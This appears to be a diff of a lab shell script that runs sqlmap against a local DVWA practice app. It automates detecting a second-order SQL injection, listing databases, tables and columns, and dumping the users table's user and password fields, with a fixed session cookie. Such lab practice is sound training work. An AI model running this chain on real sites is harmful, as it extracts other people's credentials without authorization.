@@ -4,31 +4,21 @@ TARGET_URL="http://192.168.0.103:8080/vulnerabilities/sqli/"
 PHPSESSID="orlatscvk7pkupj0bqjhknvp41"
 REQUEST_FILE="/home/gaoyin/Desktop/sqli_high.txt"
 
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-NC='\033[0m'
+sed -i "s/Cookie:.*/Cookie: PHPSESSID=$PHPSESSID; security=high/" "$REQUEST_FILE"
 
-command -v sqlmap &> /dev/null || { echo -e "${RED}[-] sqlmap not found${NC}"; exit 1; }
-[ -f "$REQUEST_FILE" ] || { echo -e "${RED}[-] File not found: $REQUEST_FILE${NC}"; exit 1; }
+echo "[*] 检测注入点"
+sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch
 
-BASE_CMD="sqlmap -r \"$REQUEST_FILE\" --second-url=\"$TARGET_URL\" --batch"
+echo "[*] 枚举所有数据库"
+sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch --dbs
 
-echo -e "${GREEN}[*] Target: $TARGET_URL${NC}"
-echo -e "${GREEN}[*] Request: $REQUEST_FILE${NC}\n"
+echo "[*] 枚举 dvwa 库的表"
+sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa --tables
 
-echo -e "${GREEN}[1/5] Detecting${NC}"
-eval $BASE_CMD
+echo "[*] 枚举 users 表的列"
+sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa -T users --columns
 
-echo -e "${GREEN}[2/5] Databases${NC}"
-eval "$BASE_CMD --dbs"
+echo "[*] 导出 user,password"
+sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa -T users -C user,password --dump
 
-echo -e "${GREEN}[3/5] Tables${NC}"
-eval "$BASE_CMD -D dvwa --tables"
-
-echo -e "${GREEN}[4/5] Columns${NC}"
-eval "$BASE_CMD -D dvwa -T users --columns"
-
-echo -e "${GREEN}[5/5] Dumping data${NC}"
-eval "$BASE_CMD -D dvwa -T users -C user,password --dump"
-
-echo -e "${GREEN}[+] Done${NC}"
+echo "[+] 完成"
